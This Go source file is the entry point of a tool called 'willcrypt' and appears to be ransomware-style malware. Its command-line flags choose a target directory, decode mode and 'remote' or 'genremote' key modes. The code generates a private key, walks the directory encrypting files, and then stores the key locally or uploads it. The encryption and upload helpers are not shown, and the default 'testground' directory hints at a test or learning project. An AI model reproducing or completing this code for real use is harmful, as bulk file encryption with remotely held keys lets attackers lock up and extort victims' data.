package main

import (
	"path/filepath"
	"sync"

	"fmt"
	"os"
	"strings"

	"github.com/spf13/pflag"
	"github.com/sywc670/willcrypt/internal/utils"
)

// FIX: mode local decode no effect。

func init() {
	pflag.StringVar(&c.TargetDir, "dir", "testground", "default testground")
	pflag.BoolVarP(&c.Debug, "debug", "v", false, "")
	pflag.StringVarP(&mode, "mode", "m", "genlocal", "")
	pflag.StringVarP(&c.SingleFilepath, "path", "f", "", "must use with single set as true")
	pflag.BoolVar(&c.IsSingle, "single", false, "")
	pflag.BoolVarP(&c.IsDecode, "decode", "d", false, "")
	pflag.StringVarP(&c.StoreKey, "store", "s", filepath.Join(getwd(), "priv.key"), "")
}

func main() {
	configure()

	priv, err := getPrivKey()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Get priv key error: %v.\n", err)
		os.Exit(1)
	}

	fmt.Println()
	fmt.Println(utils.EncodeBase64(utils.Stringify(priv)))
	fmt.Println()

	var wg sync.WaitGroup
	wg.Add(1)
	goWalkCryption(priv, &wg)
	wg.Wait()
	if !c.IsDecode {
		storeOrUpload(priv)
	}
	debug("Done...")
}

func configure() {
	pflag.Parse()
	if c.IsSingle && c.SingleFilepath == "" {
		fmt.Fprintf(os.Stderr, "Args conflict.\n")
		os.Exit(1)
	}

	switch strings.ToLower(mode) {
	case "genlocal":
		c.UseMode = ModeGenLocal
	case "local":
		c.UseMode = ModeLocal
	case "remote":
		c.UseMode = ModeRemote
	case "genremote":
		c.UseMode = ModeGenRemote
	default:
		fmt.Fprintf(os.Stderr, "Mode not supported: %s.\n", mode)
		os.Exit(1)
	}

	if c.UseMode == ModeGenLocal && c.IsDecode {
		fmt.Fprintf(os.Stderr, "Args conflict.\n")
		os.Exit(1)
	}

	if c.UseMode == ModeGenRemote && c.IsDecode {
		fmt.Fprintf(os.Stderr, "Args conflict.\n")
		os.Exit(1)
	}
}

func getwd() string {
	s, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	return s
}
